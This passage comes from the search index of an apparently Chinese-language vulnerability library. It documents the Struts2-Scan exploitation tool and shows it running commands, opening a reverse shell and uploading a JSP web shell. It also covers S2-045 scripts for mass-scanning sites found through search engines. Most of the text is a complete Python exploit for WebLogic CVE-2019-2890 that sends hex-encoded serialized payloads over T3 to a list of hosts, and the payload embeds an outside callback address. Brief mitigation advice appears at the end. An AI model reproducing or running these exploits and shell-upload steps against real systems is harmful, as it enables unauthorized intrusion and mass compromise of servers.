POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u4e0d\u9700\u8981\u53c2\u6570; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20\n[+] S2-048:\u5f71\u54cd\u7248\u672cStruts 2.3.x with Struts 1 plugin and Struts 1 action; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-053:\u5f71\u54cd\u7248\u672cStruts 2.0.1-2.3.33,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-devMode:\u5f71\u54cd\u7248\u672cStruts 2.1.0-2.3.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#url","title":"\u5355\u4e2aURL\u6f0f\u6d1e\u68c0\u6d4b:","text":"<pre><code>$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action\n\n ____  _              _       ____    ____                  \n/ ___|| |_ _ __ _   _| |_ ___|___ \\  / ___|  ___ __ _ _ __  \n\\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ \n ___) | |_| |  | |_| | |_\\__ \\/ __/   ___) | (_| (_| | | | |\n|____/ \\__|_|   \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_|\n\n                                      Author By HatBoy        \n\n[+] \u6b63\u5728\u626b\u63cfURL:http://192.168.100.8:8080/index.action\n[*] ----------------results------------------\n[*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-046\n[*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-016\n[*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-045\n[*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-015\n[*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-009\n[*] http://192.168.100.8:8080/index.action \u5b58\u5728\u6f0f\u6d1e: S2-012\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_5","title":"\u6279\u91cf\u6f0f\u6d1e\u68c0\u6d4b:","text":"<pre><code>$ python3 Struts2Scan.py -f urls.txt\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#post","title":"POST\u6570\u636e:","text":"<pre><code>$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&amp;email=admin&amp;age={exp}\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_6","title":"\u6307\u5b9a\u6f0f\u6d1e\u540d\u79f0\u5229\u7528:","text":"<pre><code># \u547d\u4ee4\u6267\u884c\n$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec\n\n ____  _              _       ____    ____                  \n/ ___|| |_ _ __ _   _| |_ ___|___ \\  / ___|  ___ __ _ _ __  \n\\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ \n ___) | |_| |  | |_| | |_\\__ \\/ __/   ___) | (_| (_| | | | |\n|____/ \\__|_|   \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_|\n\n                                      Author By HatBoy        \n\n&gt;&gt;&gt;ls -la\ntotal 136\ndrwxr-sr-x 1 root staff  4096 May  5  2017 .\ndrwxrwsr-x 1 root staff  4096 May  5  2017 ..\n-rw-r----- 1 root root  57092 Apr 13  2017 LICENSE\n-rw-r----- 1 root root   1723 Apr 13  2017 NOTICE\n-rw-r----- 1 root root   7064 Apr 13  2017 RELEASE-NOTES\n-rw-r----- 1 root root  15946 Apr 13  2017 RUNNING.txt\ndrwxr-x--- 1 root root   4096 May  5  2017 bin\ndrwx--S--- 1 root root   4096 Jul 12 14:54 conf\ndrwxr-sr-x 3 root staff  4096 May  5  2017 include\ndrwxr-x--- 2 root root   4096 May  5  2017 lib\ndrwxr-x--- 1 root root   4096 Jul 12 14:54 logs\ndrwxr-sr-x 3 root staff  4096 May  5  2017 native-jni-lib\ndrwxr-x--- 2 root root   4096 May  5  2017 temp\ndrwxr-x--- 1 root root   4096 Jul 12 14:54 webapps\ndrwxr-x--- 1 root root   4096 Jul 12 14:54 work\n&gt;&gt;&gt;\n\n# \u53cd\u5f39shll\n$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888\n\n ____  _              _       ____    ____                  \n/ ___|| |_ _ __ _   _| |_ ___|___ \\  / ___|  ___ __ _ _ __  \n\\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ \n ___) | |_| |  | |_| | |_\\__ \\/ __/   ___) | (_| (_| | | | |\n|____/ \\__|_|   \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_|\n\n                                      Author By HatBoy        \n\n[*] \u8bf7\u5728\u53cd\u5f39\u5730\u5740\u5904\u76d1\u542c\u7aef\u53e3\u5982: nc -lvvp 8080\n\n# \u83b7\u53d6WEB\u8def\u5f84\n$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath\n\n ____  _              _       ____    ____                  \n/ ___|| |_ _ __ _   _| |_ ___|___ \\  / ___|  ___ __ _ _ __  \n\\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ \n ___) | |_| |  | |_| | |_\\__ \\/ __/   ___) | (_| (_| | | | |\n|____/ \\__|_|   \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_|\n\n                                      Author By HatBoy        \n\n[*] /usr/local/tomcat/webapps/ROOT/\n\n# \u4e0a\u4f20shell\n$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp\n\n ____  _              _       ____    ____                  \n/ ___|| |_ _ __ _   _| |_ ___|___ \\  / ___|  ___ __ _ _ __  \n\\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ \n ___) | |_| |  | |_| | |_\\__ \\/ __/   ___) | (_| (_| | | | |\n|____/ \\__|_|   \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_|\n\n                                      Author By HatBoy        \n\n[+] \u6587\u4ef6\u4e0a\u4f20\u6210\u529f!\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/","title":"Index","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/#usage","title":"Usage","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/#poc","title":"\u68c0\u6d4b\u6f0f\u6d1ePOC","text":"<p>python s2_045.py http://xxx.com/a.action</p> <pre><code>&gt;python s2_045.py http://xxx.com/a.action\n[Loopholes exist] http://xxx.com/a.action\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/#poccmd","title":"\u6f0f\u6d1e\u5229\u7528POC\uff08cmd\u7248\uff09","text":"<p>python s2_045_cmd.py http://xxx.com/a.action</p> <pre><code>&gt;python s2_045_cmd.py http://xxx.com/a.action\n[Loopholes exist] http://xxx.com/a.action\n[cmd]&gt;&gt;ls\n......\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/#_1","title":"\u591a\u7ebf\u7a0b\u6279\u91cf\u68c0\u6d4b\u811a\u672c","text":"<p>python S2_045_thread.py\uff08\u586b\u5199url.txt\u540e\u8fd0\u884c\uff09</p> <pre><code>\u586b\u5199url.txt\u6587\u4ef6\uff0c\u6bcf\u884c\u4e00\u4e2aurl\u5730\u5740(url\u4e2d\u542b.action/.do\u7684\u5730\u5740)\uff0c\u8fd0\u884c\u5b8c\u4ee5\u540e\u4f1a\u751f\u6210\u4e00\u4e2aresult.txt\u6587\u4ef6\u5b58\u653e\u5b58\u5728\u6f0f\u6d1e\u7684url\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/#_2","title":"\u5229\u7528\u641c\u7d22\u5f15\u64ce\u6279\u91cf\u68c0\u6d4b\u811a\u672c","text":"<p>\u60f3\u8981\u91c7\u96c6\u7f51\u7ad9\u4e2d\u5e26.action/.do\u5730\u5740\u7684\uff0c\u8bf7\u770b\uff1aSearch_S2_045</p> <p>\u66f4\u591a\u8bf7\u53c2\u8003\u535a\u5ba2\uff1anMask</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/Search_S2_045/","title":"Index","text":"<p>\u901a\u8fc7\u641c\u7d22\u5f15\u64ce\u83b7\u53d6\u7f51\u7ad9\u5b58\u5728\u7684.action\u3001.do\u94fe\u63a5\uff0c\u5e76\u8c03\u7528s2_045\u68c0\u6d4b\u6a21\u5757\u5bf9\u8fd9\u4e9b\u94fe\u63a5\u8fdb\u884c\u6279\u91cf\u68c0\u6d4b\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/Search_S2_045/#usage","title":"Usage","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/Search_S2_045/#_1","title":"\u8fd0\u884c\u6d41\u7a0b","text":"<ul> <li>\u586b\u5199url.txt</li> <li>python search_url.py \u68c0\u6d4burl.txt\u6587\u4ef6\u4e2d\u57df\u540d\u751f\u6210result_all.txt\u6587\u4ef6</li> <li>python s2_045_judge.py \u68c0\u6d4bresult_all.txt\u6587\u4ef6\u4e2durl\u751f\u6210result.txt\u6587\u4ef6</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2_045-Poc/Search_S2_045/#_2","title":"\u6587\u4ef6\u8bf4\u660e","text":"<ul> <li>url.txt\u4e3a\u5f85\u68c0\u6d4b\u7f51\u7ad9\u57df\u540d\uff08\u4e0d\u7528http,\u4e5f\u4e0d\u7528\u76ee\u5f55\u7aef\u53e3\uff09</li> <li>result_all.txt\u4e3a\u68c0\u6d4b\u7f51\u7ad9\u6240\u6709.action/.do\u5730\u5740</li> <li>result.txt\u4e3a\u6700\u7ec8\u5b58\u5728\u6f0f\u6d1e\u7684url\u5730\u5740\u6587\u4ef6 </li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/","title":"CVE 2019 2890 Oracle WebLogic \u53cd\u5e8f\u5217\u5316\u4e25\u91cd\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#cve-2019-2890-oracle-weblogic","title":"CVE-2019-2890-Oracle WebLogic \u53cd\u5e8f\u5217\u5316\u4e25\u91cd\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u80cc\u666f","text":"<p>HSCERT\u76d1\u6d4b\u53d1\u73b0WebLogic\u5b98\u65b9\u53d1\u5e03\u4e86CVE-2019-2890\u6f0f\u6d1e\u9884\u8b66\u3002\u6b64\u6f0f\u6d1e\u5b58\u5728\u4e8eWeblogic Console\u7ec4\u4ef6\u4e2d\uff0c\u672a\u7ecf\u6388\u6743\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f HTTP \u8bf7\u6c42\uff0c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002</p> <p>WebLogic \u662f Oracle \u516c\u53f8\u51fa\u54c1\u7684\u57fa\u4e8e JavaEE \u67b6\u6784\u7684\u4e2d\u95f4\u4ef6\uff0c\u7528\u4e8e\u5f00\u53d1\u3001\u96c6\u6210\u3001\u90e8\u7f72\u548c\u7ba1\u7406\u5927\u578b\u5206\u5e03\u5f0f Web \u5e94\u7528\u3001\u7f51\u7edc\u5e94\u7528\u548c\u6570\u636e\u5e93\u5e94\u7528\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>Weblogic\u5728\u5229\u7528T3\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u8d44\u6e90\u52a0\u8f7d\u8c03\u7528\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u8fdb\u884c\u9ed1\u540d\u5355\u8fc7\u6ee4\u4ee5\u4fdd\u8bc1\u53cd\u5e8f\u5217\u5316\u5b89\u5168\u3002\u672c\u6f0f\u6d1e\u7ed5\u8fc7\u4e86Weblogic\u7684\u53cd\u5e8f\u5217\u5316\u9ed1\u540d\u5355\uff0c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684Weblogic\u7ec4\u4ef6\u5b9e\u65bd\u8fdc\u7a0b\u653b\u51fb\u3002</p> <p>\u7531\u4e8eT3\u534f\u8bae\u5728Weblogic\u63a7\u5236\u53f0\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\u9ed8\u8ba4\u5f00\u542f\uff0c\u800cWeblogic\u9ed8\u8ba4\u5b89\u88c5\u4f1a\u81ea\u52a8\u5f00\u542f\u63a7\u5236\u53f0\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6b64\u6f0f\u6d1e\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u4ee5\u63a7\u5236Weblogic\u670d\u52a1\u5668\u3002</p> <p>\u6f0f\u6d1ePoC\u5982\u4e0b\uff1a <pre><code>#!/usr/bin/python\n# -*- coding: utf-8 -*-\n# 2019-10-17 8:45\n\nimport socket\nimport time\nimport re\nimport sys\n\ntimeout = int(sys.argv[1])\nVUL=['CVE-2019-2890']\nPAYLOAD=['aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078']\nVER_SIG=['\\\\$Proxy[0-9]+']\nvul_no = []\nvul_yes = []\nvul_more_test = []\n\ndef t3handshake(sock,server_addr):\n    print '\u6b63\u5728\u8fde\u63a5\u670d\u52a1\u5668...'\n    sock.connect(server_addr)\n    sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))\n    time.sleep(1)\n    sock.recv(1024)\n\n\ndef buildT3RequestObject(sock,port,server_addr):\n    print '%s:%d\u8fde\u63a5\u6210\u529f\uff0c\u6b63\u5728\u53d1\u9001\u8bf7\u6c42...' %(server_addr[0],server_addr[1])\n    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'\n    data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport))\n    data3 = '1a7727000d3234322e323134'\n    data4 = '2e312e32353461863d1d0000000078'\n    for d in [data1,data2,data3,data4]:\n        sock.send(d.decode('hex'))\n    time.sleep(2)\n    lendate = len(sock.recv(2048))\n    print '\u53d1\u9001\u6709\u6548\u8f7d\u8377\u8bf7\u6c42\u6210\u529f,\u63a5\u6536\u957f\u5ea6:%d'%(lendate)\n    return lendate\n\ndef sendEvilObjData(sock,data,lendate):\n    print '\u6b63\u5728\u6267\u884c\u8f7d\u8377\uff0c\u8bf7\u7a0d\u7b49...'\n    payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'\n    payload+=data\n    payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'\n    payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)\n    sock.send(payload.decode('hex'))\n    time.sleep(2)\n    sock.send(payload.decode('hex'))\n    res = ''\n    start = time.time()\n    try:\n        while True:\n            res += sock.recv(4096)\n            time.sleep(0.1)\n            end =time.time()\n            timeend = end-start\n            if lendate == 0 and timeend &gt; timeout:\n                break\n    except Exception as e:\n        pass\n    return res\n\ndef checkVul(res,server_addr,index):\n    print '\u6267\u884c\u7ed3\u679c\uff1a'\n    p=re.findall(VER_SIG[index], res, re.S)\n    if len(p)&gt;0:\n        print '%s:%d \u5b58\u5728 %s \u6f0f\u6d1e\u3002'%(server_addr[0],server_addr[1],VUL[index])\n        vul_yes.append(server_addr)\n    else:\n        print '%s:%d \u4e0d\u5b58\u5728 %s \u6f0f\u6d1e\u3002' % (server_addr[0],server_addr[1],VUL[index])\n        print '[+] You look like Cai Xukun when you play basketball'\n        vul_no.append(server_addr)\n\n\ndef run(index):\n    with open(\"url.txt\",'r') as lists:\n        for server_addr in lists:\n            server_addr=server_addr.strip('\\n\\r')\n            dip=server_addr.split(':')[0]\n            global dport\n            dport=int(server_addr.split(':')[1])\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(15)\n            server_addr = (dip, dport)\n            try:\n                t3handshake(sock,server_addr)\n            except Exception as e:\n                print '%s:%d\u8fde\u63a5\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5IP\u662f\u5426\u5b58\u6d3b...' %(server_addr[0],server_addr[1])\n            else:\n                try:\n                    lendate = buildT3RequestObject(sock,dport,server_addr)\n                    rs=sendEvilObjData(sock,PAYLOAD[index],lendate)\n                    # print 'rs',rs\n                except Exception as e:\n                    print '%s:%d\u8bf7\u6c42\u9891\u7e41\uff0c\u8bf7\u7a0d\u540e\u81ea\u884c\u5355\u72ec\u6d4b\u8bd5...' %(server_addr[0],server_addr[1])\n                    vul_more_test.append(server_addr)\n                else:\n                    checkVul(rs,server_addr,index)\n            finally:\n                sock.close()\n\n    print '='*50\n    print '\u68c0\u6d4b\u5b8c\u6210\uff01'\n    print '\u4ee5\u4e0bIP\u5b58\u5728CVE-2019-2890\u6f0f\u6d1e\uff1a'\n    for yes in vul_yes:\n        print '%s:%s' % (yes[0],yes[1])\n    print '='*50\n    print '\u4ee5\u4e0bIP\u4e0d\u5b58\u5728\u6f0f\u6d1e\uff1a'\n    for no in vul_no:\n        print '%s:%s' % (no[0],no[1])\n    print '='*50\n    print '\u4ee5\u4e0bIP\u8bf7\u6c42\u9891\u7e41\uff0c\u9700\u5355\u72ec\u81ea\u884c\u6d4b\u8bd5\uff1a'\n    for more in vul_more_test:\n        print '%s:%s' % (more[0],more[1])\n    print '='*50\n\n\nif __name__==\"__main__\":\n    run(0)\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u5371\u5bb3","text":"<p>\u4e25\u91cd</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#_4","title":"\u5f71\u54cd\u7248\u672c","text":"<p>WebLogic Server 10.3.6.0</p> <p>WebLogic Server 12.1.3.0</p> <p>WebLogic Server 12.2.1.3</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2019-2890-Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/#_5","title":"\u5b89\u5168\u5efa\u8bae","text":"<p>\u4e00\u3001\u7981\u7528 T3 \u534f\u8bae  </p> <p>\u5982\u679c\u60a8\u4e0d\u4f9d\u8d56 T3 \u534f\u8bae\u8fdb\u884c JVM \u901a\u4fe1\uff0c\u53ef\u901a\u8fc7\u6682\u65f6\u963b\u65ad T3 \u534f\u8bae\u7f13\u89e3\u6b64\u6f0f\u6d1e\u5e26\u6765\u7684\u5f71\u54cd\u3002  </p> <ol> <li> <p>\u8fdb\u5165 Weblogic \u63a7\u5236\u53f0\uff0c\u5728 base_domain \u914d\u7f6e\u9875\u9762\u4e2d\uff0c\u8fdb\u5165\u201c\u5b89\u5168\u201d\u9009\u9879\u5361\u9875\u9762\uff0c\u70b9\u51fb\u201c\u7b5b\u9009\u5668\u201d\uff0c\u914d\u7f6e\u7b5b\u9009\u5668\u3002  </p> </li> <li> <p>\u5728\u8fde\u63a5\u7b5b\u9009\u5668\u4e2d\u8f93\u5165\uff1aweblogic.security.net.ConnectionFilterImpl\uff0c\u5728\u8fde\u63a5\u7b5b\u9009\u5668\u89c4\u5219\u6846\u4e2d\u8f93\u5165\uff1a* * 7001 deny t3 t3s\u3002  </p> </li> <li> <p>\u4fdd\u5b58\u751f\u6548\uff08\u65e0\u9700\u91cd\u542f\uff09\u3002  </p> </li> </ol> <p>\u4e8c\u3001\u6392\u67e5\u5f31\u53e3\u4ee4  </p> <p>\u6392\u67e5 Weblogic \u7ba1\u7406\u540e\u53f0\u662f\u5426\u5b58\u5728\u5f31\u53e3\u4ee4\uff0c\u589e\u5f3a\u5bc6\u7801\u5f3a\u5ea6\u3002  </p> <p>\u4e09\u3001\u5347\u7ea7\u8865\u4e01  </p> <p>\u76f8\u5173\u94fe\u63a5  </p> 